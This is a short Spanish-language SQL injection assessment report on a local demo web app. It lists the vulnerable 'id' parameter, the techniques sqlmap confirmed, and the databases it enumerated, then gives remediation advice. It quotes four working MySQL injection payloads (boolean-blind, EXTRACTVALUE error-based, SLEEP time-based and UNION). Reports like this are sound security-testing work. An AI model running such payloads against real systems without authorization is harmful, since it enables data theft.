# Informe de análisis SQL Injection

Objetivo: http://web.dev.local:8083

Resumen:
- Parámetro vulnerable: id (GET)
- Técnicas confirmadas por sqlmap: boolean-based blind, error-based (EXTRACTVALUE), time-based (SLEEP), UNION-based (2 columns)
- DBMS: MySQL/MariaDB
- Bases de datos encontradas: information_schema, mysql, performance_schema, sqli_demo, sys

Evidencia de explotación:
- Payloads de prueba usados (ejemplos):
  - id=1841' AND 9913=(SELECT (CASE WHEN (9913=9913) THEN 9913 ELSE (SELECT 3887 UNION SELECT 5830) END))-- -
  - id=1841' AND EXTRACTVALUE(2851,CONCAT(0x5c,0x716b7a6271,(SELECT (ELT(2851=2851,1))),0x7162707871)) AND 'fqlY'='fqlY
  - id=1841' AND (SELECT 5590 FROM (SELECT(SLEEP(5)))zGRO) AND 'dWlJ'='dWlJ
  - id=1841' UNION ALL SELECT NULL,CONCAT(0x716b7a6271,0x6446...0x7162707871)-- -

Acciones realizadas:
- Descubrimiento y escaneo automatizado con sqlmap desde /tmp/sqli_scan
- Enumeración de bases de datos (no se hallaron tablas en bases de datos de usuario reportadas)

Impacto: 
- Alta: entrada no filtrada permite extracción de datos y ejecución de consultas arbitrarias.

Recomendaciones:
1. Usar consultas parametrizadas (prepared statements) y validación estricta del parámetro 'id'.
2. Restringir privilegios de la cuenta de BD usada por la app.
3. Desactivar mensajes de error que revelen detalles (EXTRACTVALUE exploit).
4. Habilitar WAF y registros para detectar patrones de inyección.

Archivos generados y logs:
- /tmp/sqli_scan/sqlmap/ (resultados de sqlmap)
- /tmp/sqli_scan/page.html (html descargado)

